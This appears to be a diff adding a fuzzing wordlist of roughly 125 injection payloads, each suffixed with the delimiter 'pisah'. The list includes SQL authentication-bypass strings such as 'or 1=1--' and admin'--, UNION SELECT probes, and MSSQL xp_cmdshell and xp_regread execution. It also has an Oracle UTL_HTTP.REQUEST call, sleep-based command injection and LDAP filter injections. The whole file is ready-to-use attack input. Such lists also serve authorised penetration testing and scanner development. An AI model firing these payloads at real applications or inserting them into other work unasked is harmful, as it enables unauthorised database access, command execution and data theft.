@@ -1,0 +1,125 @@
+'pisah
+"pisah
+#pisah
+-pisah
+--pisah
+'%20--pisah
+--';pisah
+'%20;pisah
+=%20'pisah
+=%20;pisah
+=%20--pisah
+\x23pisah
+\x27pisah
+\x3D%20\x3B'pisah
+\x3D%20\x27pisah
+\x27\x4F\x52 SELECT *pisah
+\x27\x6F\x72 SELECT *pisah
+'or%20select *pisah
+admin'--pisah
+<>"'%;)(&+pisah
+'%20or%20''='pisah
+'%20or%20'x'='xpisah
+"%20or%20"x"="xpisah
+')%20or%20('x'='xpisah
+0 or 1=1pisah
+' or 0=0 --pisah
+" or 0=0 --pisah
+or 0=0 --pisah
+' or 0=0 #pisah
+" or 0=0 #pisah
+or 0=0 #pisah
+' or 1=1--pisah
+" or 1=1--pisah
+' or '1'='1'--pisah
+"' or 1 --'"pisah
+or 1=1--pisah
+or%201=1pisah
+or%201=1 --pisah
+' or 1=1 or ''='pisah
+" or 1=1 or ""="pisah
+' or a=a--pisah
+" or "a"="apisah
+') or ('a'='apisah
+") or ("a"="apisah
+hi" or "a"="apisah
+hi" or 1=1 --pisah
+hi' or 1=1 --pisah
+hi' or 'a'='apisah
+hi') or ('a'='apisah
+hi") or ("a"="apisah
+'hi' or 'x'='x';pisah
+@variablepisah
+,@variablepisah
+PRINTpisah
+PRINT @@variablepisah
+selectpisah
+insertpisah
+aspisah
+orpisah
+procedurepisah
+limitpisah
+order bypisah
+ascpisah
+descpisah
+deletepisah
+updatepisah
+distinctpisah
+havingpisah
+truncatepisah
+replacepisah
+likepisah
+handlerpisah
+bfilenamepisah
+' or username like '%pisah
+' or uname like '%pisah
+' or userid like '%pisah
+' or uid like '%pisah
+' or user like '%pisah
+exec xppisah
+exec sppisah
+'; exec master..xp_cmdshellpisah
+'; exec xp_regreadpisah
+t'exec master..xp_cmdshell 'nslookup www.google.com'--pisah
+--sp_passwordpisah
+\x27UNION SELECTpisah
+' UNION SELECTpisah
+' UNION ALL SELECTpisah
+' or (EXISTS)pisah
+' (select top 1pisah
+'||UTL_HTTP.REQUESTpisah
+1;SELECT%20*pisah
+to_timestamp_tzpisah
+tz_offsetpisah
+&lt;&gt;&quot;'%;)(&amp;+pisah
+'%20or%201=1pisah
+%27%20or%201=1pisah
+%20$(sleep%2050)pisah
+%20'sleep%2050'pisah
+char%4039%41%2b%40SELECTpisah
+&apos;%20ORpisah
+'sqlattempt1pisah
+(sqlattempt2)pisah
+|pisah
+%7Cpisah
+*|pisah
+%2A%7Cpisah
+*(|(mail=*))pisah
+%2A%28%7C%28mail%3D%2A%29%29pisah
+*(|(objectclass=*))pisah
+%2A%28%7C%28objectclass%3D%2A%29%29pisah
+(pisah
+%28pisah
+)pisah
+%29pisah
+&pisah
+%26pisah
+!pisah
+%21pisah
+' or 1=1 or ''='pisah
+' or ''='pisah
+x' or 1=1 or 'x'='ypisah
+/pisah
+//pisah
+//*pisah
+*/*pisah
